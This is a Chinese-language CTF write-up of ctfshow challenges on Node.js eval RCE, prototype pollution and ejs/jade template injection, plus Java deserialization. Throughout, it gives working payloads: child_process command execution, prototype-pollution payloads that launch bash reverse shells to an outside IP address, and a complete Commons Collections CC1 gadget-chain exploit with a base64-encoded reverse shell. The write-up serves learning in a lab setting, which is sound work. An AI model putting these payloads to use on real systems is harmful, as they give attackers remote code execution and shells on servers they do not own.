web334（基础）给了2个源码
var express = require(&#x27;express&#x27;);var router = express.Router();var users = require(&#x27;../modules/user&#x27;).items; var findUser = function(name, password)&#123;  return users.find(function(item)&#123;    return name!==&#x27;CTFSHOW&#x27; &amp;&amp; item.username === name.toUpperCase() &amp;&amp; item.password === password;  &#125;);&#125;;/* GET home page. */router.post(&#x27;/&#x27;, function(req, res, next) &#123;  res.type(&#x27;html&#x27;);  var flag=&#x27;flag_here&#x27;;  var sess = req.session;  var user = findUser(req.body.username, req.body.password);   if(user)&#123;    req.session.regenerate(function(err) &#123;      if(err)&#123;        return res.json(&#123;ret_code: 2, ret_msg: &#x27;登录失败&#x27;&#125;);              &#125;             req.session.loginUser = user.username;      res.json(&#123;ret_code: 0, ret_msg: &#x27;登录成功&#x27;,ret_flag:flag&#125;);                  &#125;);  &#125;else&#123;    res.json(&#123;ret_code: 1, ret_msg: &#x27;账号或密码错误&#x27;&#125;);  &#125;    &#125;);module.exports = router;
module.exports = &#123;  items: [    &#123;username: &#x27;CTFSHOW&#x27;, password: &#x27;123456&#x27;&#125;  ]&#125;;
关键逻辑在于：return name!==&#39;CTFSHOW&#39; &amp;&amp; item.username === name.toUpperCase() &amp;&amp; item.password === password;对不起这句话眼瞎了，我以为就是个简单的判断逻辑，其实就直接ctfshow就行了呜呜呜呜，我好笨
web335（RCE无过滤）参考：一道比较基础的Node.js的RCE输入?eval=1回显我们1，猜测执行语句为：console.log(eval(req))child_process核心库是直接调用我们的/bin/bash因此可以进行远程RCE
child_process.exec(command[, options][, callback])const &#123; exec &#125; = require(&#x27;node:child_process&#x27;);exec(&#x27;&quot;/path/to/test file/test.sh&quot; arg1 arg2&#x27;);// Double quotes are used so that the space in the path is not interpreted as// a delimiter of multiple arguments.exec(&#x27;echo &quot;The \\$HOME variable is $HOME&quot;&#x27;);// The $HOME variable is escaped in the first instance, but not in the second.\----------------------------------------------------------------------child_process.execSync(command[, options])
exec的同步和异步区别就是在于回显值，所谓异步就是不阻碍程序运行，所以自然不可能产生回显，因此这一题我们要使用的是execSync:?eval=require(&#39;child_process&#39;).execSync(&#39;cat f*&#39;);尝试过弹shell回来，不过无果，原因未知，应该是靶场环境问题
web336（过滤exec）和上一题一样仍然有回显，只不过参数中exec时会回显tql，也就是说有过滤这边在官方文档逛了一圈发现了：child_process.spawnSync(command[, args][, options])
const &#123; spawn &#125; = require(&#x27;node:child_process&#x27;);const ls = spawn(&#x27;ls&#x27;, [&#x27;-lh&#x27;, &#x27;/usr&#x27;]);ls.stdout.on(&#x27;data&#x27;, (data) =&gt; &#123;  console.log(`stdout: $&#123;data&#125;`);&#125;);ls.on(&#x27;close&#x27;, (code) =&gt; &#123;  console.log(`child process close all stdio with code $&#123;code&#125;`);&#125;);ls.on(&#x27;exit&#x27;, (code) =&gt; &#123;  console.log(`child process exited with code $&#123;code&#125;`);&#125;);
看一段使用实例可以发现和execSync有些不同，我们cmd的选项参数放在了后面的列表里所以payload为：?eval=require(&#39;child_process&#39;).spawnSync(&#39;ls&#39;, [&#39;-l&#39;, &#39;.&#39;]).stdout?eval=require(&#39;child_process&#39;).spawnSync(&#39;cat&#39;, [&#39;fl001g.txt&#39;]).stdout其中的stdout表示缓冲区中的内容，也就是输出结果，也可以在结尾继续追加一个toString()方法，但由于console.log把我们的数据自动解码了一下，所以可以不加
web337（Node.js数组绕过）给了源码
var express = require(&#x27;express&#x27;);var router = express.Router();var crypto = require(&#x27;crypto&#x27;);function md5(s) &#123;  return crypto.createHash(&#x27;md5&#x27;)    .update(s)    .digest(&#x27;hex&#x27;);&#125;/* GET home page. */router.get(&#x27;/&#x27;, function(req, res, next) &#123;  res.type(&#x27;html&#x27;);  var flag=&#x27;xxxxxxx&#x27;;  var a = req.query.a;  var b = req.query.b;  if(a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag))&#123;  	res.end(flag);  &#125;else&#123;  	res.render(&#x27;index&#x27;,&#123; msg: &#x27;tql&#x27;&#125;);  &#125;  &#125;);module.exports = router;
看到md5就下意识的联想到了PHP的数组绕过，由于php和js都是弱语言，所以这方面不严格，尝试了一下payloada[]=1&amp;b[]=2发现无果，而输入a[]=1&amp;b[]=1返回了flag于是乎我就进行了以下实验：
a=[1];b=[1];console.log(a+&quot;flag&#123;xxx&#125;&quot;)console.log(b+&quot;flag&#123;xxx&#125;&quot;)console.log(a.length)console.log(b.length)console.log(a===b)
我们传参a[]=1&amp;b[]=1在nodejs里实际上就是a=[1];b=[1],输出结果刚好符合条件所以输出了flag，为什么a&#x3D;&#x3D;&#x3D;b返回false呢？原因是开辟的地址空间是不一样的，虽然内容一样除了这种方法还可以输入a[&#39;x&#39;]=1&amp;b[&#39;x&#39;]=2,这和之前的就不太一样了，前者是创建了一个数组，这个是创建了一个对象:
a=&#123;    &quot;x&quot;:1&#125;b=&#123;    &quot;x&quot;:1&#125;console.log(a+&quot;flag&#123;xxx&#125;&quot;)console.log(b+&quot;flag&#123;xxx&#125;&quot;)console.log(a.length)console.log(b.length)console.log(a===b)
同样也可以bypass
web338(原型链污染）考点就是简单的原型链污染，把express的源码给你了我们重点看2个文件
var express = require(&#x27;express&#x27;);var router = express.Router();var utils = require(&#x27;../utils/common&#x27;);/* GET home page.  */router.post(&#x27;/&#x27;, require(&#x27;body-parser&#x27;).json(),function(req, res, next) &#123;  res.type(&#x27;html&#x27;);  var flag=&#x27;flag_here&#x27;;  var secert = &#123;&#125;;  var sess = req.session;  let user = &#123;&#125;;  utils.copy(user,req.body);  if(secert.ctfshow===&#x27;36dboy&#x27;)&#123;    res.end(flag);  &#125;else&#123;    return res.json(&#123;ret_code: 2, ret_msg: &#x27;登录失败&#x27;+JSON.stringify(user)&#125;);    &#125;    &#125;);module.exports = router;
module.exports = &#123;  copy:copy&#125;;function copy(object1, object2)&#123;    for (let key in object2) &#123;        if (key in object2 &amp;&amp; key in object1) &#123;            copy(object1[key], object2[key])        &#125; else &#123;            object1[key] = object2[key]        &#125;    &#125;  &#125;
注意到copy方法，他会复制2个对象之间的键值对，其中有一个对象是我们所传入的参数，另一个就是user对象，任何一个对象都有一个键叫做__proto__，他是对象的原型，可以理解为父类所以在这里我们可以通过污染原型的值，给secret对象添加ctfshow属性&#123;&quot;__proto__&quot;:&#123;&quot;ctfshow&quot;:&quot;36dboy&quot;&#125;&#125;这里通过给原型付了一个属性，污染到了secret对象
web339(变量覆盖,[ejs rce]）先写个预期解，有点累了学node.js，先总结一下非预期和预期的异同吧预期和非预期都是进行RCE，只是原理不同，前者是覆盖变量，后者是ejs模板渲染的漏洞首先在login界面输入&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/43.140.251.169/4567 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;之后访问&#x2F;api：这样就可以触发变量覆盖，导致RCE，这也是预期解，非预期解是用payload：&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;calc&#39;);var __tmp2&quot;&#125;&#125;outputFunctionName是ejs模块里opt对象的一个成员属性，由于他一开始未定义，所以我们可以污染原型从而污染outputFunctionName详细复现我会在我的文章深入探讨NodeJs里复现讲解
web340(双层污染）同样的源码也给出来了：
var express = require(&#x27;express&#x27;);var router = express.Router();var utils = require(&#x27;../utils/common&#x27;);/* GET home page.  */router.post(&#x27;/&#x27;, require(&#x27;body-parser&#x27;).json(),function(req, res, next) &#123;  res.type(&#x27;html&#x27;);  var flag=&#x27;flag_here&#x27;;  var user = new function()&#123;    this.userinfo = new function()&#123;    this.isVIP = false;    this.isAdmin = false;    this.isAuthor = false;         &#125;;  &#125;  utils.copy(user.userinfo,req.body);  if(user.userinfo.isAdmin)&#123;   res.end(flag);  &#125;else&#123;   return res.json(&#123;ret_code: 2, ret_msg: &#x27;登录失败&#x27;&#125;);    &#125;    &#125;);module.exports = router;
function copy(object1, object2)&#123;    for (let key in object2) &#123;        if (key in object2 &amp;&amp; key in object1) &#123;            copy(object1[key], object2[key])        &#125; else &#123;            object1[key] = object2[key]        &#125;    &#125;  &#125;
这一把估计也看出了有些许不同，因为copy里面的user对象后面套了一个userinfo,我们再本地测试一下到底是哪样：
console.log(user.userinfo.__proto__)console.log(user.userinfo.__proto__.__proto__)//&#123;&#125;//[Object: null prototype] &#123;&#125;
可以发现第一层外面是一个对象，也就是构造函数，并不是什么object，第二层才是，这也就是所谓的二层污染我们只需要payload：&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;isAdmin&quot;:&#123;&quot;isAdmin&quot;:true&#125;&#125;&#125;&#125;：
function copy(object1, object2)&#123;    for (let key in object2) &#123;        if (key in object2 &amp;&amp; key in object1) &#123;            copy(object1[key], object2[key])        &#125; else &#123;            object1[key] = object2[key]        &#125;    &#125;&#125;var user = new function()&#123;    this.userinfo = new function()&#123;        this.isVIP = false;        this.isAdmin = false;        this.isAuthor = false;    &#125;;&#125;var payload=&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;isAdmin&quot;:&#123;&quot;isAdmin&quot;:true&#125;&#125;&#125;&#125;&#x27;payload=JSON.parse(payload)console.log(user.userinfo.__proto__.__proto__)copy(user.userinfo,payload)console.log(&#123;&#125;.__proto__)//[Object: null prototype] &#123; isAdmin: &#123; isAdmin: true &#125; &#125;
可以看到污染到了object了已经，之后也是利用反弹shell去获取flag&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/43.140.251.169/4567 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;&#125;
web341(ejs rce污染）这就是我们上面说的非预期，来自于ejs模板opts.OutPutFuntcion属性的污染
var express = require(&#x27;express&#x27;);var router = express.Router();var utils = require(&#x27;../utils/common&#x27;);/* GET home page.  */router.post(&#x27;/&#x27;, require(&#x27;body-parser&#x27;).json(),function(req, res, next) &#123;  res.type(&#x27;html&#x27;);  var user = new function()&#123;    this.userinfo = new function()&#123;    this.isVIP = false;    this.isAdmin = false;    this.isAuthor = false;         &#125;;  &#125;;  utils.copy(user.userinfo,req.body);  if(user.userinfo.isAdmin)&#123;    return res.json(&#123;ret_code: 0, ret_msg: &#x27;登录成功&#x27;&#125;);    &#125;else&#123;    return res.json(&#123;ret_code: 2, ret_msg: &#x27;登录失败&#x27;&#125;);    &#125;  &#125;);module.exports = router;
这一题源码没有给api接口，所以我们无法使用变量覆盖，这里就得用ejs污染了&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/43.140.251.169/7777 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;&#125;&#125;&#125;这里需要解释一下为什么需要用bash -c取调用反弹shell，由于我们是在外部运行shell指令，所以他默认是不会识别我们的bash -i反弹shell的，bash -c保证了命令使用bash shell去执行还是很好理解的
web342(jade rce)app.set(&#x27;views&#x27;, path.join(__dirname, &#x27;views&#x27;));app.engine(&#x27;jade&#x27;, require(&#x27;jade&#x27;).__express); app.set(&#x27;view engine&#x27;, &#x27;jade&#x27;);app.use(logger(&#x27;dev&#x27;));app.use(express.json());app.use(express.urlencoded(&#123; extended: false &#125;));app.use(cookieParser());app.use(express.static(path.join(__dirname, &#x27;public&#x27;)));app.use(&#x27;/&#x27;, indexRouter);app.use(&#x27;/login&#x27;, loginRouter);
改动点在此处，可以发现使用的渲染引擎不再是ejs而是jade，jade的污染链也是存在的，参考：&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;type&quot;:&quot;Code&quot;,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;bash -c \&quot; bash -i &gt;&amp;/dev/tcp/43.140.251.169/7777 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;&#125;payload与上述文章有所不同，假如按照上述文章的payload（里面没有type），会出现如下报错：分析之后是node.type属性为undefine，所以导致报错，这边都会在文章深入探讨Nodejs分析复现可以成功反弹shell
web343(jade rce-过滤寂寞）payload同上都能打，好奇看了一下login.js过滤了个寂寞:
cat login.jsvar express = require(&#x27;express&#x27;);var router = express.Router();var utils = require(&#x27;../utils/common&#x27;);/* GET home page.  */router.post(&#x27;/&#x27;, require(&#x27;body-parser&#x27;).json(),function(req, res, next) &#123;  res.type(&#x27;html&#x27;);  var user = new function()&#123;    this.userinfo = new function()&#123;    this.isVIP = false;    this.isAdmin = false;    this.isAuthor = false;         &#125;;  &#125;;  if(JSON.stringify(req.body).match(/Text/ig))&#123;    res.end(&#x27;hacker go away&#x27;);  &#125;else&#123;    utils.copy(user.userinfo,req.body);    if(user.userinfo.isAdmin)&#123;      return res.json(&#123;ret_code: 0, ret_msg: &#x27;登录成功&#x27;&#125;);      &#125;else&#123;      return res.json(&#123;ret_code: 2, ret_msg: &#x27;登录失败&#x27;&#125;);      &#125;  &#125;    &#125;);
这个if(JSON.stringify(req.body).match(/Text/ig))意义何为
web344（node解析重名req）router.get(&#x27;/&#x27;, function(req, res, next) &#123;  res.type(&#x27;html&#x27;);  var flag = &#x27;flag_here&#x27;;  if(req.url.match(/8c|2c|\,/ig))&#123;  	res.end(&#x27;where is flag :)&#x27;);  &#125;  var query = JSON.parse(req.query.query);  if(query.name===&#x27;admin&#x27;&amp;&amp;query.password===&#x27;ctfshow&#x27;&amp;&amp;query.isVIP===true)&#123;  	res.end(flag);  &#125;else&#123;  	res.end(&#x27;where is flag. :)&#x27;);  &#125;&#125;);
源码逻辑已经给了，相对人性化了太多，来看看逻辑，检查了我们的url参数（编码后）不可以有8c|2c|\,,第一个是一个不可见字符，2,3表示的都是逗号，由于是get方式传参，编码必不可逃逗号给识别出来了，既然逗号被ban了，那该怎么传递多个json参数呢？?query=&#123;&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;%63tfshow&quot;&amp;query=&quot;isVIP&quot;:true&#125;对于这个请求，后端是怎么处理的呢？
router.get(&#x27;/&#x27;, function(req, res, next) &#123;  res.type(&#x27;html&#x27;);  var flag = &#x27;flag_here&#x27;;  console.log(req.url);  if(req.url.match(/8c|2c|\,/ig))&#123;    res.end(&#x27;where is flag :)&#x27;);  &#125;  console.log(req.query);  var query = JSON.parse(req.query.query);  console.log(query);  if(query.name===&#x27;admin&#x27;&amp;&amp;query.password===&#x27;ctfshow&#x27;&amp;&amp;query.isVIP===true)&#123;    res.end(flag);  &#125;else&#123;    res.end(&#x27;where is flag. :)&#x27;);  &#125;&#125;);
req.query被解析成了一个数组，之后在JSON.parse的解析下变成了对象，内容就是目标的内容，很妙！那么为什么c要编码为%63呢？c前面有双引号为%22假如不编码就是%22c可是2c被ban了，因此得编码一下

反弹shell问题web846(URLDNS)java -jar ysoserial-all.jar URLDNS [http://e861ea18-56c2-48fb-96c8-52b488d55710.challenge.ctf.show|base64](http://e861ea18-56c2-48fb-96c8-52b488d55710.challenge.ctf.show|base64)把得到的BASE64传入即可，在虚拟机里用，windows不能base64
web847使用CC1,CC6,CC7等等都可以，我选择用自己构造的payload，不用ysoserial，虽然都差不多
import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import org.apache.commons.collections.map.TransformedMap;import sun.misc.BASE64Decoder;import sun.misc.BASE64Encoder;import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.Method;import java.nio.file.Files;import java.nio.file.Paths;import java.util.Base64;import java.util.HashMap;import java.util.Map;public class CC1 &#123;    public static void main(String[] args) throws Exception &#123;        Transformer[] transformers=new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot; bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80My4xNDAuMjUxLjE2OS83MDAwIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;&#125;)        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);        HashMap&lt;Object,Object&gt; map=new HashMap&lt;&gt;();        map.put(&quot;value&quot;,&quot;aaa&quot;);        Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map, null, chainedTransformer);        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        Constructor annotationconstructor = c.getDeclaredConstructor(Class.class, Map.class);        annotationconstructor.setAccessible(true);        Object o =  annotationconstructor.newInstance(Target.class, transformedmap);        serialize(o);        String res=encryptToBase64(&quot;ser.bin&quot;);        System.out.println(res);    &#125;    public static void serialize(Object obj) throws Exception &#123;        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String filename) throws Exception &#123;        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(filename));        Object obj=ois.readObject();        return obj;    &#125;    public static String encryptToBase64(String filePath) &#123;        if (filePath == null) &#123;            return null;        &#125;        try &#123;            byte[] b = Files.readAllBytes(Paths.get(filePath));            return Base64.getEncoder().encodeToString(b);        &#125; catch (IOException e) &#123;            e.printStackTrace();        &#125;        return null;    &#125;&#125;
